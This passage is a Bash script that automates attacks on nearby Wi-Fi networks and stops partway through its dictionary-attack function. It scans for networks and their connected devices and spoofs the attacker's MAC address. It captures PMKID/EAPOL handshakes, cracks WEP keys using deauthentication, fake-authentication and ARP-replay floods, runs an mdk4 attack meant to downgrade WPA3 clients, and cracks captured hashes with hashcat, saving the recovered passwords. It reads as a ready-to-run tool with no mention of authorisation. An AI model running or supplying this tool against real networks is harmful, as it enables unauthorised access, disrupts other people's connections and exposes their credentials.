#!/bin/bash

# version: 3.6 27/5/25 03:00


### Changlog ###
	# Added PMKID attack.


### FIX ###
	# delay between scan to output
	# Close the scan window
	# rebuild wpa2-wpa3


### To Do ###
	# Add Hashcat options for auto configure combinations. + Add possibilities calc. + show the mask better. + option to remove wrong mask.
	# run all networks or range of them at the same time.
	# add more dictioneries than rockyou? or change the default from rockyou - LOOK for better WIFI wordlist
	# specific passwords lists for different vendors
	# default vendors length (for example: ZTE - 8 capital and numbers) with hashcat
	# find attacks for WPA3
	# Add clients untill we choose network.
	# Show WPS routers - and add Pixydust attack.



#######################    Instructions    ######################
# Start the script while connected to internet in order to download rockyou wordlist if not exist in it's path And OUI file for vendors name of devices and routers (will help identify farther attacks).

# **IMPORTANT** for Alfa AWUS036AXML wifi card:
# 	Don't run apt upgrade. or else the card won't work (I couldn't solve it with the Linux drivers that Alfa offered).
# 	To enable 6Ghz run: "iw reg set US" and reboot. to check if its enabled run: "iw list".


# **IMPORTANT** if we use GPU with Hashcat:
# 	If there is blank screen after installing the GPU drivers on Kali live persistance -
# 	You need to modify the file "/boot/grub/grub.cfg" from different operation system! (on kali the file will be read only):
# 	Add to the end of the kali live entry the word "nomodeset" like that:
# 		menuentry "Live system with USB persistence  (check kali.org/prst)" {
#			linux /live/vmlinuz-6.8.11-amd64 boot=live persistence components quiet splash noeject findiso=${iso_path} persistence nomodeset
#			initrd /live/initrd.img-6.8.11-amd64
# 		}
#################################################################    




# ----------------
# Variables
# ----------------
UN=${SUDO_USER:-$(whoami)}
current_date=$(date +"%d_%m_%y")
targets_path="/home/$UN/Desktop/wifi_Targets"
scan_input="$targets_path/Scan/Scan-$current_date.csv"
wordlists_dir="/usr/share/wordlists"
rockyou_file="$wordlists_dir/rockyou.txt"
rockyou_gz="$wordlists_dir/rockyou.txt.gz"
oui_file="$targets_path/oui.txt"
oui_vendor=""


# Check if the script is run as root
if [ "$EUID" -ne 0 ]; then
  echo "Please run this script as root or with sudo."
  exit 1
fi


# Ensure required directories exist
mkdir -p "$targets_path"
if [ -d "$targets_path/Scan" ]; then
    rm -rf "$targets_path/Scan"
fi
mkdir "$targets_path/Scan"
touch "$targets_path/wifi_passwords.txt"	    
chown -R $UN:$UN $targets_path




# ------------------------------
# Dependencies Installation
# ------------------------------
function install_dependencies() {
    packages=("aircrack-ng" "gnome-terminal" "wget" "hashcat" "hcxtools" "macchanger" "mdk4" "gawk" "dbus-x11")
    for package in "${packages[@]}"; do
        if ! dpkg -l | grep -q "^ii  $package "; then
            echo -e "\nUpdating the repositories.."
            apt update
            echo "$package is not installed. Installing..."
            apt install -y $package
        fi
    done
}


# ------------------------------
# Check Wordlist and OUI file
# ------------------------------
function check_wordlist() {
    # Check if /usr/share/wordlist directory exists, if not, create it
    if [ ! -d "$wordlists_dir" ]; then
        mkdir -p "$wordlists_dir"
        echo "wordlist folder created"
    fi
    # Check if rockyou.txt exists, if yes, continue code
    if [ -f "$rockyou_file" ]; then
        echo
    else
        # Check if rockyou.gz exists, if yes, unzip it
        if [ -f "$rockyou_gz" ]; then
            echo -e "\n\nrockyou.gz found. Unzipping..."
            gzip -d "$rockyou_gz"
        else
            echo -e "\n\nDownloading the rockyou wordlist file.\n"
            wget -q -P $wordlists_dir https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt 
            wait
        fi
    fi

    # Check if oui.txt exists - for vendors names
    if [ -f "$oui_file" ]; then
        echo
    else
       echo -e "\n\nDownloading OUI file - Vendors detailes.\n"
       wget -q https://raw.githubusercontent.com/idoCo10/OUI-list-2025/main/oui.txt -O  "$targets_path"/oui.txt
       wait
    fi         
}


# ------------------------------
# Adapter Configuration
# ------------------------------
function adapter_config() {
	airmon-ng check kill > /dev/null 2>&1   # Kill interfering processes

	# Check known adapters first
	if iwconfig wlan1 &> /dev/null; then
	    wifi_adapter="wlan1"
	elif iw dev wlan1mon info &>/dev/null; then
	    wifi_adapter="wlan1"
	    echo -e "\e[1mWiFi adapter:\e[0m $wifi_adapter \nThe adapter is in monitor mode."
	    return 0    
	elif iwconfig wlan0 &> /dev/null; then
	    wifi_adapter="wlan0"
	elif iw dev wlan0mon info &>/dev/null; then
	    wifi_adapter="wlan0"
	    echo -e "\e[1mWiFi adapter:\e[0m $wifi_adapter \nThe adapter is in monitor mode."
	    return 0
	else
	    # Auto-detect WiFi adapter before asking the user
	    detected_adapter=$(iw dev | awk '$1=="Interface"{print $2}')
	    if [[ -n "$detected_adapter" ]]; then
	        wifi_adapter="$detected_adapter"
	        #echo -e "\e[1mDetected WiFi adapter:\e[0m $wifi_adapter"
	    else
	        read -p "WiFi adapter not detected. Please enter the name of your WiFi adapter: " wifi_adapter
	    fi
	fi  	
	echo -e "\e[1mWiFi adapter:\e[0m $wifi_adapter\nChanging $wifi_adapter to monitor mode"
	airmon-ng start "$wifi_adapter" > /dev/null 2>&1

	# Find the new monitor mode adapter name
	mon_adapter=$(iw dev | awk '/Interface/ && /mon$/ {print $2}')

	if [[ -n "$mon_adapter" ]]; then
		# Extract the original adapter name by removing 'mon' from the end
		wifi_adapter="${mon_adapter%mon}"
	else
		echo -e "\e[31mFailed to start monitor mode. Check your adapter and try again.\e[0m"
		exit 1
	fi
}


# ------------------------------
# Change adapter mac address
# ------------------------------
function spoof_adapter_mac() {
	# Spoof Adapter mac address to random address
	echo -e "\nRandomizing our wifi adapter mac address:"
	
	ifconfig ${wifi_adapter}mon down
        macchanger -r ${wifi_adapter}mon > /dev/null 2>&1
        ifconfig ${wifi_adapter}mon up
        macchanger -s ${wifi_adapter}mon
	random_mac=$(ip link show ${wifi_adapter}mon | awk '/link\/ieee802.11/ {print $2}') 
}


# ------------------------------
# Network Scanner
# ------------------------------
function network_scanner() {	
        # Scan 15 seconds for wifi networks   
        countdown_duration=15
        gnome-terminal --geometry=110x35-10000-10000 -- bash -c "timeout ${countdown_duration}s airodump-ng --band abg ${wifi_adapter}mon --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date"        

        echo -e "\n\n\e[1;34mScanning available WiFi Networks ($countdown_duration s):\e[0m"
        for (( i=$countdown_duration; i>=1; i-- )); do
            tput cuu1 && tput el
            echo -e "\e[1;34mScanning for available WiFi Networks:\033[1;31m\033[1m $i \033[0m"
            sleep 1
        done
        mv $targets_path/Scan/Scan-$current_date-01.csv $scan_input
        cp "$scan_input" "$scan_input.original"
        
	# Extract client MAC and associated BSSID from the original scan without displaying them
	clients_content=$(awk -F, '/Station MAC/ {flag=1; next} flag && $1 ~ /:/ {client_mac=$1; bssid=$6; if (bssid !~ /(not associated)/) printf "%-22s %s\n", client_mac, bssid}' "$scan_input.original")
        
        # Fix WPA3 shown as WPA3-WPA2
	awk -F',' 'BEGIN { OFS="," }
	{
	    if ($6 ~ /^[[:space:]]*WPA3 WPA2[[:space:]]*$/ && $8 ~ /^[[:space:]]*SAE[[:space:]]*$/) {
		sub(/WPA3 WPA2/, "WPA3", $6)
	    }
	    print
	}' "$scan_input.original" > "$scan_input.cleaned"


	# Edit original scan file to a more organized format
	awk -F, 'BEGIN {OFS=","} {print $1, $4, $6, $9, $14}' "$scan_input.cleaned" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input" # Extract relevant fields
	awk '/^Station MAC,/ {print; exit} {print}' "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"           # Delete the clients part
	awk -F',' '$NF ~ /\S/' "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"                                # Delete networks without names
	tail -n +2 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"                                            # Remove the header
	head -n -1 "$scan_input" > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input"                                            # Remove the footer
	awk -F, '{ gsub(/^ */, "", $0); gsub(/ *$/, "", $0); print $0 }' "$scan_input" | sort -t, -k4,4nr -k5 > "$scan_input.tmp" && mv "$scan_input.tmp" "$scan_input" # Sort by power and name

	# Append the client information to the end of the scan file
	echo -e "\nStation MAC:            BSSID:\n$clients_content" >> "$scan_input"

	# Display available WiFi networks
	echo -e "\n\033[1;33mAvailable WiFi Networks:\033[0m\n"

	# Display the scan input file contents with row numbers
	printf "\033[1m      Name: %-30s Clients: %-1s Encryption: %-1s Channel: %-1s Power: %-1s Signal: %-0s BSSID: %-13s Vendor: %-1s\033[0m\n"
	echo "--------------------------------------------------------------------------------------------------------------------------------------------------"

	declare -A client_counts
	while IFS= read -r client_line; do
	    bssid=$(echo "$client_line" | awk '{print $2}')
	    # Ensure bssid is not empty before incrementing
	    if [[ -n "$bssid" ]]; then
		((client_counts["$bssid"]++))
	    fi
	done <<< "$clients_content"

	# Process and display only the WiFi network section (exclude the Station MAC section)
	awk '/^Station MAC/ {exit} {print}' "$scan_input" | nl -w2 -s', ' | awk -F', ' '{print $0}' | while read -r line; do
	    # Skip empty lines
	    if [[ -z "$line" ]]; then
		continue
	    fi
	    index=$(echo "$line" | cut -d',' -f1 | xargs)
	    mac=$(echo "$line" | cut -d',' -f2 | xargs)
	    channel=$(echo "$line" | cut -d',' -f3 | xargs)
	    encryption=$(echo "$line" | cut -d',' -f4 | xargs)
	    power=$(echo "$line" | cut -d',' -f5 | xargs)
	    ssid=$(echo "$line" | cut -d',' -f6 | tr -d '|')  # remove "|" from SSID name

	    # Get the vendor dynamically
	    vendor=$(get_oui_vendor "$mac")
	    # Get the number of clients for this BSSID
	    client_count=${client_counts["$mac"]}
	    clients_display=""
	    if [[ -n "$client_count" ]]; then
		clients_display="+$client_count"
	    fi
	      
	    # Convert dBm power values into signal bars representation
	    signal_strength=$power  # Assuming power is in dBm (negative values)
    	    if (( signal_strength >= -60 )); then
	        bars="\e[1;32m▂▄▆█\e[0m"  # Excellent
	    elif (( signal_strength >= -70 )); then
	        bars="\e[1;33m▂▄▆_\e[0m"  # Good 
	    elif (( signal_strength >= -80 )); then
	        bars="\e[1;35m▂▄__\e[0m"  # Fair
	    elif (( signal_strength >= -90 )); then
	        bars="\e[1;36m▂___\e[0m"  # Weak 
	    else
	        bars="\e[1;31m____\e[0m"  # Very Weak 
	    fi

	    # Colorize encryption type using if-elif, replacing with colorized label
	    temp_encryption=$encryption

	    if [[ "$temp_encryption" == "WPA3" ]]; then
	        encryption_color="\e[1;31mWPA3\e[0m"  # Red
	    elif [[ "$temp_encryption" == "WPA3 WPA2" || "$temp_encryption" == "WPA2 WPA3" ]]; then
	        encryption_color="\e[91mWPA3 WPA2\e[0m"  # Red
	    elif [[ "$temp_encryption" == "WPA2" ]]; then
	        encryption_color="\e[93mWPA2\e[0m"  # Orange
	    elif [[ "$temp_encryption" == "WPA2 WPA" || "$temp_encryption" == "WPA WPA2" ]]; then
	        encryption_color="\e[96mWPA2 WPA\e[0m"  # Cyan
	    elif [[ "$temp_encryption" == "WPA" ]]; then
	        encryption_color="\e[1;36mWPA\e[0m" 	        
	    elif [[ "$temp_encryption" == "OPN" || "$temp_encryption" == "Open" ]]; then
	        encryption_color="\e[92mOPEN\e[0m"  # Green
	    else
	        encryption_color="$temp_encryption"  # Default color
	    fi


	    # Use printf to format the fields and pipe into column for proper alignment
	    if [[ -n "$vendor" ]]; then
		printf "%-4s %-35s | %-7s | %-10b | %-7s | %-5s | %-5b | %-17s | %-1s\n" \
		    "$index." "$ssid" "$clients_display" "$encryption_color" "$channel" "$power" "$bars" "$mac" "$vendor"
	    else
		printf "%-4s %-35s | %-7s | %-10b | %-7s | %-5s | %-5b | %-17s\n" \
		    "$index." "$ssid" "$clients_display" "$encryption_color" "$channel" "$power" "$bars" "$mac"
	    fi
	done | column -t -s "|"
	echo
        
        num_rows=$(awk '/Station MAC/ {exit} NF {count++} END {print count}' "$scan_input") # Calculate the number of valid rows (above the empty line before "Station MAC")
		    	    
        choose_network
}


# ------------------------------
# Choose Network
# ------------------------------
function choose_network() {
    while :; do
        # Prompt the user to choose a row number
        read -p "Enter row number: " row_number
        echo
        # Keep asking for a valid row number
        while :; do
            re='^[0-9]+$'
            if ! [[ $row_number =~ $re ]]; then
                echo -e "\033[1;31m\033[1m\nError:\033[0m Not a valid number."
            elif (( row_number < 1 || row_number > num_rows )); then
                echo -e "\033[1;31m\033[1m\nError:\033[0m Row number out of range."
            else
                break
            fi
            echo
            read -p "Enter row number: " row_number
            echo
        done

        # Extracting values from airodump-ng scan file
        chosen_row=$(awk -v row="$row_number" 'NR == row' "$scan_input")
        bssid_address=$(echo "$chosen_row" | awk -F', ' '{print $1}')
        channel=$(echo "$chosen_row" | awk -F', ' '{print $2}')
        encryption=$(echo "$chosen_row" | awk -F', ' '{print $3}')
        power=$(echo "$chosen_row" | awk -F', ' '{print $4}')
        bssid_name=$(echo "$chosen_row" | awk -F', ' '{print $5}')
        bssid_name_original=${bssid_name}

        # Remove "/" from bssid name
        if [[ $bssid_name == *"/"* ]]; then
            bssid_name=${bssid_name//\//}
        fi

        oui_vendor=$(get_oui_vendor)

        # Echo values
        echo -e "\033[1;31m\033[1mBSSID Name:\033[0m $bssid_name_original"
        if [[ -n "$oui_vendor" ]]; then
            echo -e "\033[1;31m\033[1mMAC Address:\033[0m $bssid_address - $oui_vendor"
        else
            echo -e "\033[1;31m\033[1mMAC Address:\033[0m $bssid_address"
        fi

        if [ "$encryption" = "OPN" ]; then
            echo -e "\033[1;31m\033[1mEncryption:\033[0m none"
        else
            echo -e "\033[1;31m\033[1mEncryption:\033[0m $encryption"
        fi
        echo -e "\033[1;31m\033[1mChannel:\033[0m $channel"
        #echo -e "\033[1;31m\033[1mPower:\033[0m $power"        
        echo
        echo

        if [ "$encryption" = "OPN" ]; then
            echo -e "\033[1mThe Network is open.\033[0m"
            echo -e "Choose different Network.\n"
            continue  
        elif [[ "$encryption" == "WPA3" ]]; then
            echo -e "\033[1mThe Encryption is "$encryption". This script can't crack it yet.\033[0m"
            echo -e "Choose different Network.\n"
            continue           
        elif [[ "$encryption" == "WEP" ]]; then
            #echo -e "\033[1mThe Encryption is "$encryption".\033[0m"
	    crack_wep
            continue                    
        fi

        # Check if we already have the Wi-Fi password for this BSSID
        if grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep -q "The Wi-Fi password is:"; then
            wifi_password=$(grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep "The Wi-Fi password is:" | awk -F': ' '{print $2}' | xargs)
            echo -e "\033[1;32mPassword already exists for this network!\033[0m"
            echo -e "\033[1;34mThe Wi-Fi password is:\033[0m \033[1;33m$wifi_password\033[0m\n"
            echo -e "Choose different Network.\n"
            continue 
        fi

        # Check if this BSSID was previously marked as failed with Rockyou wordlist   
        if grep -A1 "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt" | grep -q "Password not cracked with Rockyou wordlist"; then
            echo -e "\033[1;34mPassword for $bssid_name (BSSID: $bssid_address)\033[0m was already checked and \033[1;31mnot found in Rockyou wordlist.\033[0m\n" 
            echo -e "Choose different Attack..\n"
            choose_attack
        fi

        # If we only captured the handshake from previous scan
        if [ -d "$targets_path/$bssid_name" ]; then
            if grep -q "We got handshake for ($bssid_address): $(printf '%q' "$bssid_name")" "$targets_path/wifi_passwords.txt"; then
                echo -e "\033[1;32mHandshake found from previous scan.\033[0m\n"
                pkill aireplay-ng
                pkill airodump-ng
                cleanup
                choose_attack
                exit 1   
            else
                rm -r $targets_path/"$bssid_name" 
                mkdir $targets_path/"$bssid_name"           
            fi   
        else
            mkdir $targets_path/"$bssid_name"           
        fi

        validate_network
        
        break  
    done
}


# ------------------------------
# Validate Network
# ------------------------------
function validate_network() {
    echo -e "\e[1mValidating network:\e[0m"
    
    # Open airodump-ng in a hidden terminal
    gnome-terminal --geometry=105x15-10000-10000 -- script -c "airodump-ng --band abg -c $channel -w '$targets_path/$bssid_name/$bssid_name' -d $bssid_address $wifi_adapter"mon"" "$targets_path/$bssid_name/airodump_output.txt"

    found=0
    echo -n "Checking"
    
    for (( i=0; i<20; i++ )); do
        if [ "$(grep -c "$bssid_address" "$targets_path/$bssid_name/airodump_output.txt")" -ge 2 ]; then
            found=1
            echo -e "\n\e[1;32mNetwork available!\e[0m\n"
            break
        fi
        echo -n "."  # Show progress dots
        sleep 1
    done

    echo ""  # New line after dots

    if [ $found -eq 0 ]; then
        pkill aireplay-ng
        pkill airodump-ng
        echo -e "\e[1;31mNetwork appears to be offline now.\e[0m"
        another_scan_prompt
    fi
}



# ------------------------------------
# Get the vendors names of the devices
# ------------------------------------
function get_oui_vendor() {
    local mac="$1"
    # If no argument is provided, use the global variable bssid_address
    if [[ -z "$mac" ]]; then
        mac="$bssid_address"
    fi
    local oui=$(echo "$mac" | awk -F':' '{print toupper($1 ":" $2 ":" $3)}') # Extract OUI in uppercase
    if [[ -f $oui_file ]]; then
        local vendor=$(grep -i "^$oui" "$oui_file" | awk '{$1=""; print $0}' | xargs | tr -d '\r')
        echo "$vendor"
    else
        echo ""
    fi
}



# ------------------------------
# Dvices Scanner
# ------------------------------
function devices_scanner() {
    seen_macs=()
    devices_header_shown=false
    while true; do
        target_devices=$(grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")

        if [ -n "$target_devices" ]; then
            while IFS= read -r mac; do
                if [[ -n "$mac" && ! " ${seen_macs[*]} " =~ " $mac " ]]; then
                    seen_macs+=("$mac")

                    # Print the "Devices Found" header once
                    if [ "$devices_header_shown" = false ]; then
                        echo -e "\n\033[1;34mDevices Found:\033[0m"
                        devices_header_shown=true
                    fi

                    # Print new device
                    vendor=$(get_oui_vendor "$mac")
                    if [[ -n "$vendor" ]]; then
                        echo -e "$mac - $vendor"
                    else
                        echo -e "$mac"
                    fi
                fi
            done <<< "$(echo "$target_devices" | tr ' ' '\n')"
        fi
        sleep 1
    done
}



# ------------------------------------------
# Capture PMKID/EAPOL 
# ------------------------------------------
function capture_handshake() {
    pcapng_file="$targets_path/$bssid_name/hcxdump.pcapng"
    hash_file="$targets_path/$bssid_name/hash.hc22000"

    # Create BPF filter
    hcxdumptool --bpfc="wlan addr3 $bssid_address" > "$targets_path/$bssid_name/filter.bpf"

    # Determine the band suffix based on channel number
    if [[ "$channel" -ge 1 && "$channel" -le 14 ]]; then
        band="a"
    elif [[ "$channel" -ge 36 && "$channel" -le 165 ]]; then
        band="b"
    elif [[ "$channel" -ge 191 && "$channel" -le 233 ]]; then
        band="c"
    elif [[ "$channel" -ge 1 && "$channel" -le 9 ]]; then
        band="e"
    else
        band=""
    fi

    echo -e "\033[1;31m\033[1mStarting PMKID attack ->>\033[0m"

    # Start device scanner in background
    devices_scanner &
    scanner_pid=$!

    # Start hcxdumptool in hidden terminal
    if [[ -n "$band" ]]; then
        channel_with_band="${channel}${band}"
        gnome-terminal --geometry=95x30-10000-10000 -- bash -c "hcxdumptool -i '${wifi_adapter}mon' -c '$channel_with_band' -w '$pcapng_file' -F --bpf='${targets_path}/${bssid_name}/filter.bpf' --rds=1" &
    else
        echo "Warning: Unknown channel ($channel), running without -c"
        gnome-terminal --geometry=95x30-10000-10000 -- bash -c "hcxdumptool -i '${wifi_adapter}mon' -w '$pcapng_file' -F --bpf='${targets_path}/${bssid_name}/filter.bpf' --rds=1" &
    fi

    sleep 2
    terminal_pid=$(pgrep gnome-terminal)

    counter=0
    max_tries=24  # 24 * 5s = 120 seconds

    while (( counter < max_tries )); do
        hcxpcapngtool -o "$hash_file" "$pcapng_file" &>/dev/null

        if [[ -s "$hash_file" ]]; then
            #pmkid_count=$(grep -c '^WPA\*01\*' "$hash_file")
            #eapol_count=$(grep -c '^WPA\*02\*' "$hash_file")
            
            sta_mac=$(grep -m1 '^WPA\*0[12]\*' "$hash_file" | cut -d'*' -f5 | sed 's/../&:/g; s/:$//' | tr 'a-f' 'A-F')
            sleep 3

            if grep -q '^WPA\*01\*' "$hash_file"; then
                #echo -e "\n\033[1;32m->> Got the PMKID!\033[0m\n"
		echo -e "\n\033[1;32m->> Got the PMKID!  \033[0m($sta_mac)\n"
                break
            elif grep -q '^WPA\*02\*' "$hash_file"; then
                echo -e "\n\033[1;32m->> Got the EAPOL handshake!  \033[0m($sta_mac)\n"
                break
            fi
        fi

        sleep 5
        ((counter++))
    done

    # Kill scanner and hcxdumptool terminal
    kill "$scanner_pid" &>/dev/null
    kill "$terminal_pid" &>/dev/null
    pkill aireplay-ng
    pkill airodump-ng


    if (( counter == max_tries )); then
        echo -e "\n\n\e[31mTimeout: No PMKID or EAPOL captured in 120 seconds.\e[0m"
        another_scan_prompt
        return
    fi

    echo --- >> "$targets_path/wifi_passwords.txt"
    printf "We got handshake for (%s): %-40s at %s\n" "$bssid_address" "$bssid_name" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
}





# ------------------------------
# Router with Mixed Encryption
# ------------------------------
function mixed_encryption() {
    echo -e "\033[1mThe Encryption is "$encryption". \nThe devices may be using WPA3, we will try to trick them to switch to WPA2 so we could crack the password.\033[0m\n"
    gnome-terminal --geometry=70x3-10000-10000 -- timeout 95s mdk4 $wifi_adapter"mon" b -n $bssid_name_original -c $channel -w a
    sleep 5
}



# -------------------------
# Crack WEP Encryption
# -------------------------
function crack_wep() {
    output_file="$targets_path/$bssid_name/WEP_output.txt"
    airodump_terminal_pid=""
    arp_replay_terminal_pid=""

    if [ -d "$targets_path/$bssid_name" ]; then
        rm -rf "$targets_path/$bssid_name"
    fi
    mkdir -p "$targets_path/$bssid_name" # Ensure directory is created
    touch "$output_file"

    echo -e "\n\033[1;33mStarting WEP Cracking:\033[0m"
    echo -e "Monitor the \033[1;36m#Data\033[0m column in the \033[1;32maircrack-ng\033[0m window. You typically need 30K-50K IVs."
    
    # Start airodump-ng in a new terminal and get the terminal's PID
    # The 'exec bash' at the end of commands run in gnome-terminal keeps the terminal open after the command finishes, useful for inspection.
    # Remove 'exec bash' if you want the terminal to close automatically.
    gnome-terminal --geometry=92x17-10000-10000 -- bash -c "airodump-ng --bssid $bssid_address --channel $channel --write \"$targets_path/$bssid_name/$bssid_name\" ${wifi_adapter}mon; exec bash" &
    airodump_terminal_pid=$!

    #echo -e "[*] Waiting 6 seconds for airodump-ng to initialize and create capture files..."
    sleep 6

    # Check if capture file was created
    if [ ! -f "$targets_path/$bssid_name/$bssid_name-01.cap" ]; then
        echo -e "\033[1;31mError: Capture file ($targets_path/$bssid_name/$bssid_name-01.cap) not created. Airodump-ng might have failed. Aborting WEP crack.\033[0m"
        if [ -n "$airodump_terminal_pid" ]; then kill "$airodump_terminal_pid" 2>/dev/null; fi
        return 1
    fi
    
    echo -e "[*] Attempting deauthentication attack to generate IVs..."
    gnome-terminal --geometry=78x4-10000-10000 -- timeout 10s aireplay-ng --deauth 10 -a "$bssid_address" "${wifi_adapter}mon"
    # No need to wait for deauth terminal, it's short-lived

    echo -e "[*] Attempting fake authentication with AP ($bssid_address)..."
    gnome-terminal --geometry=78x5-10000-10000 -- bash -c "aireplay-ng -1 0 -a $bssid_address -h $random_mac ${wifi_adapter}mon; echo 'Fake auth attempt finished. Press Enter to close.'; read"
    #echo -e "[*] Pausing for 3 seconds after fake authentication attempt..."
    sleep 3 # Give time for fake auth to potentially associate

    echo -e "[*] Attempting ARP Replay attack to generate IVs faster..."
    # Start ARP Replay in a new terminal and get its PID
    gnome-terminal --geometry=78x6-10000+10000 -- bash -c "aireplay-ng -3 -b $bssid_address -h $random_mac ${wifi_adapter}mon; echo 'ARP Replay attack finished or stopped. Press Enter to close.'; read" &
    arp_replay_terminal_pid=$!
    sleep 2 # Give ARP replay a moment to start

    #echo -e "\n[*] Entering cracking loop. Will attempt to crack with aircrack-ng periodically."
    #echo -e "    You can monitor IVs in the airodump-ng window and cracking attempts in new aircrack-ng windows."

    attempts=0
    while true; do
        ((attempts++))
        echo -e "\n--- Cracking Attempt $attempts ---"
        
        # Check if key already found by a previous manual check or other process
        if grep -q "KEY FOUND!" "$output_file"; then
            echo -e "\033[1;32mKey already found in output file (perhaps manually or by a concurrent process)!\033[0m"
            break
        fi

        #echo -e "[*] Running aircrack-ng (10s timeout)..."
        # Use --wait for this terminal as we want the script to wait for aircrack-ng's attempt
        # CRITICAL FIX: Changed 'tee' to 'tee -a' to append to the output file
        gnome-terminal --wait --geometry=84x23-10000+10000 -- bash -c "timeout 10s aircrack-ng -b $bssid_address \"$targets_path/$bssid_name/$bssid_name-01.cap\" | tee -a \"$output_file\"; echo 'Aircrack-ng attempt finished. This window will close in 5s.'; sleep 5"
        
        # Check if aircrack-ng found the key in its latest output
        if grep -q "KEY FOUND!" "$output_file"; then
            echo -e "\033[1;32mKEY FOUND by aircrack-ng!\033[0m"
            break
        else
            echo -e "[*] Key not found in this attempt. Will retry after 3 seconds."
            #echo -e "    Ensure enough IVs (#Data) are being collected."
            #echo -e "    If IV count is stagnant, ARP replay might not be effective (e.g., no clients or AP not responding to ARP requests)."
        fi
    
        sleep 3 # Wait before next cracking attempt
    done

    #echo -e "\n[*] Exited cracking loop."

    # Kill the airodump-ng and ARP replay terminals
    if [ -n "$airodump_terminal_pid" ] && kill -0 "$airodump_terminal_pid" 2>/dev/null; then
        echo "[*] Closing airodump-ng terminal..."
        kill "$airodump_terminal_pid" 2>/dev/null
    fi
    if [ -n "$arp_replay_terminal_pid" ] && kill -0 "$arp_replay_terminal_pid" 2>/dev/null; then
        echo "[*] Closing ARP replay terminal..."
        kill "$arp_replay_terminal_pid" 2>/dev/null
    fi
    # General cleanup for any stray aireplay processes
    pkill aireplay-ng > /dev/null 2>&1
    pkill airodump-ng > /dev/null 2>&1


    if grep -q "KEY FOUND!" "$output_file"; then
        # Try to extract ASCII first
        wifi_pass=$(grep "KEY FOUND!" "$output_file" | tail -n 1 | sed -n 's/.*ASCII: \([^)]*\).*/\1/p')
        if [ -z "$wifi_pass" ]; then
            # If ASCII not found or empty, extract HEX
            wifi_pass=$(grep "KEY FOUND!" "$output_file" | tail -n 1 | sed -n 's/.*KEY FOUND! \[ \([^ ]*\) \].*/\1/p' | tr -d ':')
            echo -e "\033[1;33mWEP Key (HEX):\033[0m \033[1;32m$wifi_pass\033[0m"
        else
            echo -e "\033[1;33mWEP Key (ASCII):\033[0m \033[1;32m$wifi_pass\033[0m"
        fi
        
        echo -e "\n\n\033[1;34mThe Wi-Fi password for\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m \033[1;32m$wifi_pass\033[0m"
        echo -e "Important: If this is a HEX key, you might not need to enter the colons (:)."
        echo -e "---" >> "$targets_path/wifi_passwords.txt"
        printf "The Wi-Fi password for %s (%s) is: %s\n" "$bssid_name_original" "$bssid_address" "$wifi_pass" >> "$targets_path/wifi_passwords.txt"
    else
        echo -e "\033[1;31mFailed to crack WEP password after attempts.\033[0m"
        echo -e "Consider running the capture for a longer time to collect more IVs."
    fi

    cleanup # Call your main cleanup function
    #echo -e "\nReturning to network selection or exiting..."
    # Decide if you want to call another_scan_prompt or exit from here
    # For now, it will fall through to the calling logic in choose_network
    # If you want to exit script after WEP attempt: exit 0 (success) or exit 1 (if failed)
    # another_scan_prompt 
    exit 1
}


# -------------------------
# Dictionary Attack
# -------------------------

function dictionary_attack() {
while true; do
    echo -e "\n\033[1mChoose a wordlist:\033[0m"
    echo "1. Use rockyou.txt"
    echo "2. Use a different dictionary"
    read -p "Enter your choice (1 or 2): " wordlist_choice

    case "$wordlist_choice" in
        1)
            dict_file="$rockyou_file"
            break
            ;;
        2)
            read -e -p "Enter the full path to your custom dictionary file: " custom_dict
            if [ -f "$custom_dict" ]; then
                dict_file="$custom_dict"
                break
            else
                echo -e "\e[1;31mError:\e[0m File does not exist. Please try again."
            fi
            ;;
        *)
            echo -e "\e[1;31mInvalid choice. Please enter 1 or 2.\e[0m"
            ;;
    esac
done

echo -e "\n\e[1mCracking Wi-Fi password using:\e[0m $dict_file \e[1m->>\e[0m\n"

    gnome-terminal --geometry=82x21-10000-10000 --wait -- bash -c \
    "hashcat -m 22000 -a 0 \"$targets_path/$bssid_name/hash.hc22000\" \"$dict_file\" \
    --outfile \"$targets_path/$bssid_name/$bssid_name-wifi_password.txt\" \
    --force --optimized-kernel-enable --status --status-timer=5 --potfile-disable; sleep 5"

    echo
    if [ -f "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
        wifi_pass=$(grep "$bssid_name_original" "$targets_path/$bssid_name/$bssid_name-wifi_password.txt" | awk -F"$bssid_name_original:" '{print $2}')
        echo -e "\033[1;34mThe Wi-Fi password of\033[0m \033[1;31m\033[1m$bssid_name_original\033[0m \033[1;34mis:\033[0m\t\033[1;33m$wifi_pass\033[0m"
        bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
        
        #sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ { s/\nPassword not cracked with// } }" "$targets_path/wifi_passwords.txt"
        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with.*/ { s/\nPassword not cracked with.*// } }" "$targets_path/wifi_passwords.txt"

        #sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/ { N; /\nPassword not cracked with/ d; }" "$targets_path/wifi_passwords.txt"

        
        
        sed -i "/We got handshake for ($bssid_address): $bssid_name_escaped/a The Wi-Fi password is:   $wifi_pass" "$targets_path/wifi_passwords.txt"
        rm -r "$targets_path/$bssid_name"
        exit 1
    else
        echo -e "\n\033[1;31m\033[1mCouldn't crack the password with the selected wordlist.\033[0m\n"
        
        bssid_name_escaped=$(printf '%s' "$bssid_name" | sed -e 's/[]\/$*.^[]/\\&/g')
